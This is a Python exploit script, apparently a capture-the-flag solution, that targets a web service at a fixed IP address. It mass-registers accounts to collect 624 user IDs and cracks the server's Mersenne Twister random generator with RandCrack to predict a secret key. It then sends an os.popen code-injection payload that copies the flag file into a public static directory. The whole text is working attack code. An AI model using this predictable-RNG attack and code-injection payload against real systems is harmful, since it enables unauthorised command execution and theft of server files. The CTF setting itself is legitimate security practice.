import requests
from randcrack import RandCrack

BASE = "http://49.232.42.74:30777"
REG_URL = BASE + "/register"
API_URL = BASE + "/api"

def collect_outputs(n=624):
    outs = []
    for i in range(n):
        username = f"usewr{i:04d}"
        password = "pass"
        r = requests.post(REG_URL, json={"username": username, "password": password})
        j = r.json()
        uid = int(j["user_id"])
        outs.append(uid)
        print(f"[{i+1}/{n}] got {uid}")
    return outs

def main():
    rc = RandCrack()

    print("[*] Collecting 624 user_id outputs...")
    outs = collect_outputs(624)

    print("[*] Feeding outputs into RandCrack...")
    for o in outs:
        rc.submit(o)

    print("[*] Predicting next random value (key2)...")
    predicted = rc.predict_getrandbits(32)
    print("[+] Predicted key2:", predicted)

    payload = "__import__('os').popen('cat /flag > ./static/1.txt').read()"

    print("[*] Sending exploit to /api ...")
    res = requests.post(API_URL, json={"key": str(predicted), "payload": payload})
    print("[+] Response:", res.text)

if __name__ == "__main__":
    main()
